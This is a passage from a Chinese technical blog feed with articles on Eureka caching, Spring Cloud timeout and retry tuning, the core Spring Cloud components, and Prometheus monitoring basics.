<h2 id="Eureka-Server端优秀的多级缓存机制"><a href="#Eureka-Server端优秀的多级缓存机制" class="headerlink" title="Eureka Server端优秀的多级缓存机制"></a>Eureka Server端优秀的多级缓存机制</h2><p>假设Eureka Server部署在4核8G的普通机器上，那么基于内存来承载各个服务的请求，每秒钟最多可以处理多少请求呢？</p>
<p>● 根据之前做过的测试，单台4核8G的机器，处理一些纯内存的操作，哪怕加上一些网络请求的开销，每秒处理几百请求是很轻松的。哪怕是更大规模的机器和请求量，处理起来，也是轻松加愉快。</p>
<p>● 而且Eureka Server为了避免同时读写内存数据结构造成的并发冲突问题，还采用了多级缓存机制来进一步提升服务请求的响应速度。</p>
<p>● 在拉取注册表的时候：</p>
<p>◑ 首先从ReadOnlyCacheMap里查缓存的注册表。</p>
<p>◑ 如果没有，就找ReadWriteCacheMap里缓存的注册表。</p>
<p>◑ 如果还没有，就从内存中获取实际的注册表数据。</p>
<p>● 在注册表发生变更的时候：</p>
<p>◑ 会在内存中更新变更的注册表数据，同时过期掉ReadWriteCacheMap。</p>
<p>◑ 这个过程不会影响ReadOnlyCacheMap提供人家查询注册表。</p>
<p>◑ 在一段时间内，默认是30秒，各个服务拉取注册表数据都会直接读ReadOnlyCacheMap。</p>
<p>◑ 在30秒过后，Eureka Server的后台线程发现ReadWriteCacheMap已经清空了，那么也会清空ReadOnlyCacheMap中的缓存</p>
<p>◑ 下次有服务拉取注册表，又会从内存中获取最新的数据了，同时填充各个缓存。</p>
<p>多级缓存机制的优点是什么？</p>
<p>1.这种多级缓存机制的设计，尽可能保证了内存注册表数据不会出现频繁的读写冲突问题。</p>
<p>2.并且进一步保证对Eureka Server的大量请求，都是快速从纯内存走，性能极高。</p>
<p>为方便大家更好的理解，同样来一张图，大家跟着图再来回顾一下这整个过程：</p>
<p> <img src="/articles/32a029fb/3.jpg" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>● 通过上面的分析可以看到，Eureka通过设置适当的请求频率（拉取注册表30秒间隔，发送心跳30秒间隔），可以保证一个大规模的系统每秒请求Eureka Server的次数在几百次。</p>
<p>● 同时还通过纯内存的注册表，保证了所有的请求都可以在内存处理，这样确保了极高的性能，普通机器一秒钟处理几百请求都是轻松+愉快的。</p>
<p>● 另外还有多级缓存机制，确保说不会针对内存数据结构发生频繁的读写并发冲突操作，进一步提升性能。</p>
<p>上述就是Spring Cloud架构中，Eureka作为微服务注册中心可以承载大规模系统每天千万级访问量的原理</p>
]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务架构系列思考&lt;二&gt;</title>
    <url>/articles/4c5309d0.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>相信不少朋友都在自己公司使用Spring Cloud框架来构建微服务架构，毕竟现在这是非常火的一门技术。</p>
<p>如果只是用户量很少的传统IT系统，使用Spring Cloud可能还暴露不出什么问题。</p>
<p>如果是较多用户量，高峰每秒高达上万并发请求的互联网公司的系统，使用Spring Cloud技术就有一些问题需要注意了。</p>
<a id="more"></a>

<h2 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h2><h4 id="场景引入，问题初现"><a href="#场景引入，问题初现" class="headerlink" title="场景引入，问题初现"></a>场景引入，问题初现</h4><p>先不空聊原理、理论，来讲一个真实的例子，这是我的一个朋友在创业互联网公司发生过的真实案例。</p>
<p>朋友A的公司做互联网类的创业，组建了一个小型研发团队，上来就用了Spring Cloud技术栈来构建微服务架构的系统。一段时间没日没夜的加班，好不容易核心业务系统给做出来了，平时正常QA测试没发现什么大毛病，感觉性能还不错，一切都很完美。<br>然后系统就这么上线了，一开始用户规模很小，注册用户量小几十万，日活几千用户。</p>
<p>每天都有新的数据进入数据库的表中，就这么日积月累的，没想到数据规模居然慢慢吞吞增长到了单表几百万。</p>
<p>这个时候呢，看起来也没太大的毛病，就是有用户反映，系统有些操作，会感觉卡顿几秒钟，会刷不出来页面。</p>
<p><strong>这是为啥呢？</strong></p>
<ul>
<li>核心原因是单表数据量大了一些，达到了几百万。</li>
<li>有个别服务，跑的SQL比较复杂，一大堆的多表关联</li>
<li>并且还没有设计好索引，或者是设计了索引，但无奈一些小弟写了上百行的大SQL，SQL实在太复杂了，那么一个SQL跑出来好几秒肯定是正常的。</li>
</ul>
<p>如果大家对微服务框架有点了解的话，应该知道，比如Feign + Ribbon组成的服务调用框架，是有接口调用超时这一说的，有一些参数可以设置接口调用的超时时间。</p>
<p>如果你调用一个接口，好几秒刷不出来，人家就超时异常返回，用户就刷不出来页面了。</p>
<h4 id="扬汤止沸，饮鸩止渴"><a href="#扬汤止沸，饮鸩止渴" class="headerlink" title="扬汤止沸，饮鸩止渴"></a>扬汤止沸，饮鸩止渴</h4><p>一般碰到这种事情，一大坨屎一样的SQL摆在那儿，写SQL的人过一个月自己都看不懂了，80%的工程师看着都不愿意去花时间重写和优化。</p>
<p>一是修改的人力成本太高，二是谁敢负担这责任呢？系统跑的好好的，就是慢了点而已，结果你硬是乱改一通，重构，把系统核心业务流程搞挂了怎么办？</p>
<p>所以说，那些兄弟第一反应是：增加超时时间啊！接口慢点可以，但是别超时不响应啊！</p>
<p>让接口执行个几秒把结果返回，用户不就可以刷出来页面了！不用重构系统了啊！轻松+愉快！</p>
<p>如何增加呢？很简单，看下面的参数就知道了：</p>
<p> <img src="/articles/4c5309d0/1.jpg" alt> </p>
<p>大家如果看过之前的文章，应该知道，Spring Cloud里一般会用hystrix的线程池来执行接口调用的请求。。</p>
<p>所以设置超时一般设置两个地方，feign和ribbon那块的超时，还有hystrix那块的超时。其中后者那块的超时一般必须大于前者。</p>
<p>Spring Cloud玩儿的好的兄弟，可千万别看着这些配置发笑，因为我确实见过不少Spring Cloud玩儿的没那么溜的哥们，真的就这么干了。</p>
<p>好了，日子在继续。。。</p>
<p>优化了参数后，看上去效果不错，用户虽然觉得有的页面慢是慢点，但是起码过几秒能刷出来。</p>
<p>这个时候，日活几千的用户量，压根儿没什么并发可言，高峰期每秒最多一二十并发请求罢了。</p>
<p>大家看看下面这张图，感受一下现场氛围：</p>
<p><img src="/articles/4c5309d0/2.jpg" alt></p>
<h4 id="问题爆发，洪水猛兽"><a href="#问题爆发，洪水猛兽" class="headerlink" title="问题爆发，洪水猛兽"></a>问题爆发，洪水猛兽</h4><p>随着时间的推移，公司业务高速发展……</p>
<p>那位兄弟的公司，在系统打磨成熟，几万用户试点都ok之后，老板立马拿到一轮几千万的融资。</p>
<p>公司上上下下意气风发啊！紧接着就是组建运营团队，地推团队，全国大范围的推广。</p>
<p>总之就是三个字：推！推！推！</p>
<p>这一推不打紧！研发人员在后台系统发现，自己的用户量蹭蹭蹭的增长，注册用户增长了几十倍，突破了千万级别，日活用户也翻了几十倍，在活动之类的高峰期，居然达到了上百万的日活用户量。。。</p>
<p>幸福的烦恼。。。</p>
<p>为什么这么说？因为用户量上来后，悲剧的事情就发生了。</p>
<p><strong>高峰期每秒的并发请求居然达到了近万的程度</strong>，研发团队的兄弟们哪里敢怠慢！在这个过程中，先是紧张的各种扩容服务，一台变两台，两台变八台。</p>
<p>然后数据库主从架构挂上去，读写分离是必须的，否则单个数据库服务器哪能承载那么大的请求！多搞几个从库，扛一下大量的读请求，这样基本就扛住了。</p>
<p>正准备松口气，更加悲剧的事情就发生了。</p>
<p>在这个过程中，那些兄弟经常会发现高峰期，系统的某个功能页面，突然就整个hang死了，就是没法再响应任何请求！所有用户刷新这个页面全部都是无法响应！</p>
<p>这是为什么呢？</p>
<p><strong>原因很简单啊</strong>！一个服务A的实例里，专门调用服务B的那个线程池里的线程，总共可能就几十个。每个线程调用服务B都会卡住5秒钟。</p>
<p>那如果每秒钟过来几百个请求这个服务实例呢？一下子那个线程池里的线程就全部hang死了，没法再响应任何请求了。</p>
<p>大家来看看下面这张图，再直观的感受一下这个无助的过程！</p>
<p> <img src="/articles/4c5309d0/3.jpg" alt></p>
<p>这个时候咋办？兄弟们只能祭出程序员最古老的法宝，重启机器！</p>
<p>遇到页面刷不出来，只能重启机器，相当于短暂的初始化了一下机器内的资源。</p>
<p>然后接着运行一段时间，又卡死，再次重启！真是令人崩溃啊！用户们的体验是极差的，老板的心情是愤怒的！</p>
<p>画外音：</p>
<p>其实这个问题本身不大，但如果对Spring Cloud没有高并发场景的真实经验，确实可能会跟这帮兄弟一样，搞出些莫名其妙的问题。</p>
<p>比如这个公司，明明应该去优化服务接口性能，结果硬是调大了超时时间。结果导致并发量高了，对那个服务的调用直接hang死，系统的核心页面刷不出来，影响用户体验了，这怪谁呢？</p>
<h4 id="追本溯源，治标治本"><a href="#追本溯源，治标治本" class="headerlink" title="追本溯源，治标治本"></a>追本溯源，治标治本</h4><p>没法子了，那帮兄弟们只能找人求助。下面就是他们完成系统优化的过程。</p>
<p><strong>第一步</strong></p>
<p>关键点，优化图中核心服务B的性能。互联网公司，核心业务逻辑，面向C端用户高并发的请求，不要用上百行的大SQL，多表关联，那样单表几百万行数据量的话，会导致一下执行好几秒。</p>
<p>其实最佳的方式，就是对数据库就执行简单的单表查询和更新，然后复杂的业务逻辑全部放在java系统中来执行，比如一些关联，或者是计算之类的工作。</p>
<p>这一步干完了之后，那个核心服务B的响应速度就已经优化成几十毫秒了，是不是很开心？从几秒变成了几十毫秒！</p>
<p><strong>第二步</strong></p>
<p>那个超时的时间，也就是上面那段ribbon和hystrix的超时时间设置。</p>
<p>奉劝各位同学，不要因为系统接口的性能过差而懒惰，搞成几秒甚至几十秒的超时，一般超时定义在1秒以内，是比较通用以及合理的。</p>
<p>为什么这么说？</p>
<p>因为一个接口，理论的最佳响应速度应该在200ms以内，或者慢点的接口就几百毫秒。</p>
<p>如果一个接口响应时间达到1秒+，建议考虑用缓存、索引、NoSQL等各种你能想到的技术手段，优化一下性能。</p>
<p>否则你要是胡乱设置超时时间是几秒，甚至几十秒，万一下游服务偶然出了点问题响应时间长了点呢？那你这个线程池里的线程立马全部卡死！</p>
<p>具体hystrix的线程池以及超时时间的最佳生产实践，请见下一篇文章：《微服务架构如何保障双11狂欢下的99.99%高可用》</p>
<p>这两步解决之后，其实系统表现就正常了，核心服务B响应速度很快速，而且超时时间也在1秒以内，不会出现hystrix线程池频繁卡死的情况了。</p>
<p><strong>第三步</strong></p>
<p>事儿还没完，你要真觉得两步就搞定了，那还是经验不足。</p>
<p>如果你要是超时时间设置成了1秒，如果就是因为偶然发生的网络抖动，导致接口某次调用就是在1.5秒呢？这个是经常发生的，因为网络的问题，接口调用偶然超时。</p>
<p>所以此时配合着超时时间，一般都会设置一个合理的重试，如下所示：</p>
<p> <img src="/articles/4c5309d0/4.jpg" alt></p>
<p>设置这段重试之后，Spring Cloud中的Feign + Ribbon的组合，在进行服务调用的时候，如果发现某台机器超时请求失败，会自动重试这台机器，如果还是不行会换另外一台机器重试。</p>
<p>这样由于偶尔的网络请求造成的超时，不也可以通过自动重试避免了？</p>
<p><strong>第四步</strong></p>
<p>其实事儿还没完，如果把重试参数配置了，结果你居然就放手了，那还是没对人家负责任啊！</p>
<p>你的系统架构中，只要涉及到了重试，那么必须上接口的幂等性保障机制。</p>
<p>否则的话，试想一下，你要是对一个接口重试了好几次，结果人家重复插入了多条数据，该怎么办呢？</p>
<p>其实幂等性保证本身并不复杂，根据业务来，常见的方案：</p>
<p>可以在数据库里建一个唯一索引，插入数据的时候如果唯一索引冲突了就不会插入重复数据<br>或者是通过redis里放一个唯一id值，然后每次要插入数据，都通过redis判断一下，那个值如果已经存在了，那么就不要插入重复数据了。<br>类似这样的方案还有一些。总之，要保证一个接口被多次调用的时候，不能插入重复的数据。</p>
<h2 id="总结全文"><a href="#总结全文" class="headerlink" title="总结全文"></a>总结全文</h2><p>有图有真相！老规矩，最后给大家上一张图，最终优化后的系统表现大概是长下面这样子的。</p>
<p> <img src="/articles/4c5309d0/5.jpg" alt></p>
]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务架构系列思考&lt;一&gt;</title>
    <url>/articles/e36292b2.html</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>毫无疑问，Spring Cloud是目前微服务架构领域的翘楚，无数的书籍博客都在讲解这个技术。不过大多数讲解还停留在对Spring Cloud功能使用的层面，其底层的很多原理，很多人可能并不知晓。因此本文将通过大量的手绘图，给大家谈谈Spring Cloud微服务架构的底层原理。</p>
<p>实际上，Spring Cloud是一个全家桶式的技术栈，包含了很多组件。本文先从其最核心的几个组件入手，来剖析一下其底层的工作原理。也就是Eureka、Ribbon、Feign、Hystrix、Zuul这几个组件。</p>
 <a id="more"></a>

<h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>先来给大家说一个业务场景，假设咱们现在开发一个电商网站，要实现支付订单的功能，流程如下：</p>
<p>创建一个订单之后，如果用户立刻支付了这个订单，我们需要将订单状态更新为“已支付”</p>
<p>扣减相应的商品库存</p>
<p>通知仓储中心，进行发货</p>
<p>给用户的这次购物增加相应的积分</p>
<p>针对上述流程，我们需要有<strong>订单服务、库存服务、仓储服务、积分服务</strong>。整个流程的大体思路如下：</p>
<p>用户针对一个订单完成支付之后，就会去找订单服务，更新订单状态</p>
<p>订单服务调用库存服务，完成相应功能</p>
<p>订单服务调用仓储服务，完成相应功能</p>
<p>订单服务调用积分服务，完成相应功能</p>
<p>至此，整个支付订单的业务流程结束</p>
<p>下图这张图，清晰表明了各服务间的调用过程：</p>
<p><img src="/articles/e36292b2/1.jpg" alt></p>
<p> 好！有了业务场景之后，咱们就一起来看看Spring Cloud微服务架构中，这几个组件如何相互协作，各自发挥的作用以及其背后的原理。</p>
<h2 id="Spring-Cloud核心组件"><a href="#Spring-Cloud核心组件" class="headerlink" title="Spring Cloud核心组件"></a>Spring Cloud核心组件</h2><h4 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h4><p>咱们来考虑第一个问题：订单服务想要调用库存服务、仓储服务，或者是积分服务，怎么调用？</p>
<p>订单服务压根儿就不知道人家库存服务在哪台机器上啊！他就算想要发起一个请求，都不知道发送给谁，有心无力！</p>
<p>这时候，就轮到Spring Cloud Eureka出场了。Eureka是微服务架构中的注册中心，专门负责服务的注册与发现。</p>
<p>咱们来看看下面的这张图，结合图来仔细剖析一下整个流程： </p>
<p><img src="/articles/e36292b2/2.png" alt></p>
<p>如上图所示，库存服务、仓储服务、积分服务中都有一个Eureka Client组件，这个组件专门负责将这个服务的信息注册到Eureka Server中。说白了，就是告诉Eureka Server，自己在哪台机器上，监听着哪个端口。而Eureka Server是一个注册中心，里面有一个注册表，保存了各服务所在的机器和端口号</p>
<p>订单服务里也有一个Eureka Client组件，这个Eureka Client组件会找Eureka Server问一下：库存服务在哪台机器啊？监听着哪个端口啊？仓储服务呢？积分服务呢？然后就可以把这些相关信息从Eureka Server的注册表中拉取到自己本地缓存起来。</p>
<p>这时如果订单服务想要调用库存服务，不就可以找自己本地的Eureka Client问一下库存服务在哪台机器？监听哪个端口吗？收到响应后，紧接着就可以发送一个请求过去，调用库存服务扣减库存的那个接口！同理，如果订单服务要调用仓储服务、积分服务，也是如法炮制。</p>
<p><strong>总结一下</strong>：</p>
<ul>
<li><p>Eureka Client：负责将这个服务的信息注册到Eureka Server中</p>
</li>
<li><p>Eureka Server：注册中心，里面有一个注册表，保存了各个服务所在的机器和端口号</p>
</li>
</ul>
<h4 id="Feign"><a href="#Feign" class="headerlink" title="Feign"></a>Feign</h4><p>现在订单服务确实知道库存服务、积分服务、仓库服务在哪里了，同时也监听着哪些端口号了。但是新问题又来了：难道订单服务要自己写一大堆代码，跟其他服务建立网络连接，然后构造一个复杂的请求，接着发送请求过去，最后对返回的响应结果再写一大堆代码来处理吗？</p>
<p>这是上述流程翻译的代码片段，咱们一起来看看，体会一下这种绝望而无助的感受！！！</p>
<p><strong>友情提示，前方高能</strong>：</p>
<p><img src="/articles/e36292b2/3.png" alt></p>
<p> 看完上面那一大段代码，有没有感到后背发凉、一身冷汗？实际上你进行服务间调用时，如果每次都手写代码，代码量比上面那段要多至少几倍，所以这个事儿压根儿就不是地球人能干的。</p>
<p>既然如此，那怎么办呢？别急，Feign早已为我们提供好了优雅的解决方案。来看看如果用Feign的话，你的订单服务调用库存服务的代码会变成啥样？</p>
<p><img src="/articles/e36292b2/4.png" alt></p>
<p>看完上面的代码什么感觉？是不是感觉整个世界都干净了，又找到了活下去的勇气！没有底层的建立连接、构造请求、解析响应的代码，直接就是用注解定义一个 FeignClient接口，然后调用那个接口就可以了。人家Feign Client会在底层根据你的注解，跟你指定的服务建立连接、构造请求、发起靕求、获取响应、解析响应，等等。这一系列脏活累活，人家Feign全给你干了。</p>
<p>那么问题来了，Feign是如何做到这么神奇的呢？很简单，<strong>Feign的一个关键机制就是使用了动态代理</strong>。咱们一起来看看下面的图，结合图来分析：</p>
<ul>
<li><p>首先，如果你对某个接口定义了@FeignClient注解，Feign就会针对这个接口创建一个动态代理</p>
</li>
<li><p>接着你要是调用那个接口，本质就是会调用 Feign创建的动态代理，这是核心中的核心</p>
</li>
<li><p>Feign的动态代理会根据你在接口上的@RequestMapping等注解，来动态构造出你要请求的服务的地址</p>
</li>
<li><p>最后针对这个地址，发起请求、解析响应</p>
</li>
</ul>
<p> <img src="/articles/e36292b2/5.png" alt></p>
<h4 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h4><p>说完了Feign，还没完。现在新的问题又来了，如果人家库存服务部署在了5台机器上，如下所示：</p>
<p>192.168.169:9000</p>
<p>192.168.170:9000</p>
<p>192.168.171:9000</p>
<p>192.168.172:9000</p>
<p>192.168.173:9000</p>
<p>这下麻烦了！人家Feign怎么知道该请求哪台机器呢？</p>
<ul>
<li>这时Spring Cloud Ribbon就派上用场了。Ribbon就是专门解决这个问题的。它的作用是负载均衡，会帮你在每次请求时选择一台机器，均匀的把请求分发到各个机器上</li>
</ul>
<ul>
<li>Ribbon的负载均衡默认使用的最经典的Round Robin轮询算法。这是啥？简单来说，就是如果订单服务对库存服务发起10次请求，那就先让你请求第1台机器、然后是第2台机器、第3台机器、第4台机器、第5台机器，接着再来—个循环，第1台机器、第2台机器。。。以此类推。</li>
</ul>
<p> 此外，Ribbon是和Feign以及Eureka紧密协作，完成工作的，具体如下：</p>
<ul>
<li><p>首先Ribbon会从 Eureka Client里获取到对应的服务注册表，也就知道了所有的服务都部署在了哪些机器上，在监听哪些端口号。</p>
</li>
<li><p>然后Ribbon就可以使用默认的Round Robin算法，从中选择一台机器</p>
</li>
<li><p>Feign就会针对这台机器，构造并发起请求。</p>
</li>
</ul>
<p> 对上述整个过程，再来一张图，帮助大家更深刻的理解：</p>
<p><img src="/articles/e36292b2/6.png" alt></p>
<h4 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h4><p>在微服务架构里，一个系统会有很多的服务。以本文的业务场景为例：订单服务在一个业务流程里需要调用三个服务。现在假设订单服务自己最多只有100个线程可以处理请求，然后呢，积分服务不幸的挂了，每次订单服务调用积分服务的时候，都会卡住几秒钟，然后抛出—个超时异常。</p>
<p><strong>咱们一起来分析一下，这样会导致什么问题？</strong></p>
<ol>
<li><p>如果系统处于高并发的场景下，大量请求涌过来的时候，订单服务的100个线程都会卡在请求积分服务这块。导致订单服务没有一个线程可以处理请求</p>
</li>
<li><p>然后就会导致别人请求订单服务的时候，发现订单服务也挂了，不响应任何请求了</p>
</li>
</ol>
<p>上面这个，<strong>就是微服务架构中恐怖的服务雪崩问题</strong>，如下图所示：</p>
<p><img src="/articles/e36292b2/7.jpg" alt></p>
<p>如上图，这么多服务互相调用，要是不做任何保护的话，某一个服务挂了，就会引起连锁反应，导致别的服务也挂。比如积分服务挂了，会导致订单服务的线程全部卡在请求积分服务这里，没有一个线程可以工作，瞬间导致订单服务也挂了，别人请求订单服务全部会卡住，无法响应。</p>
<p><strong>但是我们思考一下，就算积分服务挂了，订单服务也可以不用挂啊！</strong>为什么？</p>
<ul>
<li><p>我们结合业务来看：支付订单的时候，只要把库存扣减了，然后通知仓库发货就OK了</p>
</li>
<li><p>如果积分服务挂了，大不了等他恢复之后，慢慢人肉手工恢复数据！为啥一定要因为一个积分服务挂了，就直接导致订单服务也挂了呢？不可以接受！</p>
</li>
</ul>
<p><strong>现在问题分析完了，如何解决</strong>？</p>
<p>这时就轮到Hystrix闪亮登场了。Hystrix是隔离、熔断以及降级的一个框架。啥意思呢？说白了，Hystrix会搞很多个小小的线程池，比如订单服务请求库存服务是一个线程池，请求仓储服务是一个线程池，请求积分服务是一个线程池。每个线程池里的线程就仅仅用于请求那个服务。</p>
<p><strong>打个比方：现在很不幸，积分服务挂了，会咋样？</strong></p>
<p>当然会导致订单服务里的那个用来调用积分服务的线程都卡死不能工作了啊！但是由于订单服务调用库存服务、仓储服务的这两个线程池都是正常工作的，所以这两个服务不会受到任何影响。</p>
<p>这个时候如果别人请求订单服务，订单服务还是可以正常调用库存服务扣减库存，调用仓储服务通知发货。只不过调用积分服务的时候，每次都会报错。但是<strong>如果积分服务都挂了，每次调用都要去卡住几秒钟干啥呢？有意义吗？当然没有！</strong>所以我们直接对积分服务熔断不就得了，比如在5分钟内请求积分服务直接就返回了，不要去走网络请求卡住几秒钟，这个过程，就是所谓的熔断！</p>
<p><strong>那人家又说，兄弟，积分服务挂了你就熔断，好歹你干点儿什么啊！</strong>别啥都不干就直接返回啊？没问题，咱们就来个降级：每次调用积分服务，你就在数据库里记录一条消息，说给某某用户增加了多少积分，因为积分服务挂了，导致没增加成功！这样等积分服务恢复了，你可以根据这些记录手工加一下积分。这个过程，就是所谓的降级。</p>
<p>为帮助大家更直观的理解，接下来用一张图，梳理一下Hystrix隔离、熔断和降级的全流程：</p>
<p><img src="/articles/e36292b2/8.png" alt></p>
<h4 id="Zuul"><a href="#Zuul" class="headerlink" title="Zuul"></a>Zuul</h4><p>说完了Hystrix，接着给大家说说最后一个组件：Zuul，也就是微服务网关。这个组件是负责网络路由的。不懂网络路由？行，那我给你说说，如果没有Zuul的日常工作会怎样？</p>
<p>假设你后台部署了几百个服务，现在有个前端兄弟，人家请求是直接从浏览器那儿发过来的。打个比方：人家要请求一下库存服务，你难道还让人家记着这服务的名字叫做inventory-service？部署在5台机器上？就算人家肯记住这一个，你后台可有几百个服务的名称和地址呢？难不成人家请求一个，就得记住一个？你要这样玩儿，那真是友谊的小船，说翻就翻！</p>
<p>上面这种情况，压根儿是不现实的。所以一般微服务架构中都必然会设计一个网关在里面，像android、ios、pc前端、微信小程序、H5等等，不用去关心后端有几百个服务，就知道有一个网关，所有请求都往网关走，网关会根据请求中的一些特征，将请求转发给后端的各个服务。</p>
<p>而且有一个网关之后，还有很多好处，比如可以做统一的降级、限流、认证授权、安全，等等。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>最后再来总结一下，上述几个Spring Cloud核心组件，在微服务架构中，分别扮演的角色：</p>
<ul>
<li><strong>Eureka</strong>：各个服务启动时，Eureka Client都会将服务注册到Eureka Server，并且Eureka Client还可以反过来从Eureka Server拉取注册表，从而知道其他服务在哪里</li>
<li><strong>Ribbon</strong>：服务间发起请求的时候，基于Ribbon做负载均衡，从一个服务的多台机器中选择一台</li>
<li><strong>Feign</strong>：基于Feign的动态代理机制，根据注解和选择的机器，拼接请求URL地址，发起请求</li>
<li><strong>Hystrix</strong>：发起请求是通过Hystrix的线程池来走的，不同的服务走不同的线程池，实现了不同服务调用的隔离，避免了服务雪崩的问题</li>
<li><strong>Zuul</strong>：如果前端、移动端要调用后端系统，统一从Zuul网关进入，由Zuul网关转发请求给对应的服务</li>
</ul>
<p>以上就是我们通过一个电商业务场景，阐述了Spring Cloud微服务架构几个核心组件的底层原理。</p>
<p> <img src="/articles/e36292b2/9.png" alt></p>
<p>文字总结还不够直观？没问题！我们将Spring Cloud的5个核心组件通过一张图串联起来，再来直观的感受一下其底层的架构原理：</p>
]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Prometheus基本原理和使用</title>
    <url>/articles/65b2b731.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Prometheus是由SoundCloud开发的开源监控报警系统和时序列数据库(TSDB)。Prometheus使用Go语言开发，是Google BorgMon监控系统的开源版本。</p>
<p>2016年由Google发起Linux基金会旗下的原生云基金会(Cloud Native Computing Foundation), 将Prometheus纳入其下第二大开源项目。Prometheus目前在开源社区相当活跃。</p>
<p>Prometheus和Heapster(Heapster是K8S的一个子项目，用于获取集群的性能数据。)相比功能更完善、更全面。Prometheus性能也足够支撑上万台规模的集群。</p>
 <a id="more"></a>

<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/prometheus/prometheus" target="_blank" rel="noopener">https://github.com/prometheus/prometheus</a></p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p><a href="https://prometheus.io/" target="_blank" rel="noopener">https://prometheus.io/</a></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>多维度数据模型。<br>灵活的查询语言。<br>不依赖分布式存储，单个服务器节点是自主的。<br>通过基于HTTP的pull方式采集时序数据。<br>可以通过中间网关进行时序列数据推送。<br>通过服务发现或者静态配置来发现目标服务对象。<br>支持多种多样的图表和界面展示，比如Grafana等。</p>
<h2 id="相关组件："><a href="#相关组件：" class="headerlink" title="相关组件："></a>相关组件：</h2><p>Prometheus生态系统由多个组件组成，它们中的一些是可选的。多数Prometheus组件是Go语言写的，这使得这些组件很容易编译和部署。</p>
<p><strong>Prometheus Server</strong><br>主要负责数据采集和存储，提供PromQL查询语言的支持。</p>
<p><strong>客户端SDK</strong><br>官方提供的客户端类库有go、java、scala、python、ruby，其他还有很多第三方开发的类库，支持nodejs、php、erlang等。</p>
<p><strong>Push Gateway</strong><br>支持临时性Job主动推送指标的中间网关。</p>
<p><strong>PromDash</strong><br>使用Rails开发可视化的Dashboard，用于可视化指标数据。</p>
<p><strong>Exporter</strong><br>Exporter是Prometheus的一类数据采集组件的总称。它负责从目标处搜集数据，并将其转化为Prometheus支持的格式。与传统的数据采集组件不同的是，它并不向中央服务器发送数据，而是等待中央服务器主动前来抓取。</p>
<p>Prometheus提供多种类型的Exporter用于采集各种不同服务的运行状态。目前支持的有数据库、硬件、消息中间件、存储系统、HTTP服务器、JMX等。</p>
<p><strong>alertmanager</strong><br>警告管理器，用来进行报警。</p>
<p><strong>prometheus_cli</strong><br>命令行工具。</p>
<p><strong>其他辅助性工具</strong><br>多种导出工具，可以支持Prometheus存储数据转化为HAProxy、StatsD、Graphite等工具所需要的数据存储格式。</p>
<h2 id="架构："><a href="#架构：" class="headerlink" title="架构："></a>架构：</h2><p>下面这张图说明了Prometheus的整体架构，以及生态中的一些组件作用:</p>
<p><img src="/articles/65b2b731/1.png" alt></p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>是通过HTTP协议周期性抓取被监控组件的状态，任意组件只要提供对应的HTTP接口就可以接入监控。不需要任何SDK或者其他的集成过程。这样做非常适合做虚拟化环境监控系统，比如VM、Docker、Kubernetes等。输出被监控组件信息的HTTP接口被叫做exporter 。目前互联网公司常用的组件大部分都有exporter可以直接使用，比如Varnish、Haproxy、Nginx、MySQL、Linux系统信息(包括磁盘、内存、CPU、网络等等)。</p>
<p>Prometheus服务过程大概是这样：</p>
<p>Prometheus Daemon负责定时去目标上抓取metrics(指标)数据，每个抓取目标需要暴露一个http服务的接口给它定时抓取。Prometheus支持通过配置文件、文本文件、Zookeeper、Consul、DNS SRV Lookup等方式指定抓取目标。Prometheus采用PULL的方式进行监控，即服务器可以直接通过目标PULL数据或者间接地通过中间网关来Push数据。</p>
<p>Prometheus在本地存储抓取的所有数据，并通过一定规则进行清理和整理数据，并把得到的结果存储到新的时间序列中。</p>
<p>Prometheus通过PromQL和其他API可视化地展示收集的数据。Prometheus支持很多方式的图表可视化，例如Grafana、自带的Promdash以及自身提供的模版引擎等等。Prometheus还提供HTTP API的查询方式，自定义所需要的输出。</p>
<p>PushGateway支持Client主动推送metrics到PushGateway，而Prometheus只是定时去Gateway上抓取数据。</p>
<p>Alertmanager是独立于Prometheus的一个组件，可以支持Prometheus的查询语句，提供十分灵活的报警方式。</p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p><strong>适用的场景</strong><br>Prometheus在记录纯数字时间序列方面表现非常好。它既适用于面向服务器等硬件指标的监控，也适用于高动态的面向服务架构的监控。对于现在流行的微服务，Prometheus的多维度数据收集和数据筛选查询语言也是非常的强大。Prometheus是为服务的可靠性而设计的，当服务出现故障时，它可以使你快速定位和诊断问题。它的搭建过程对硬件和服务没有很强的依赖关系。</p>
<p><strong>不适用的场景</strong></p>
<p>Prometheus它的价值在于可靠性，甚至在很恶劣的环境下，你都可以随时访问它和查看系统服务各种指标的统计信息。 如果你对统计数据需要100%的精确，它并不适用，例如：它不适用于实时计费系统。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Prometheus</category>
      </categories>
      <tags>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title>openfalcon的基本原理和使用</title>
    <url>/articles/cd887590.html</url>
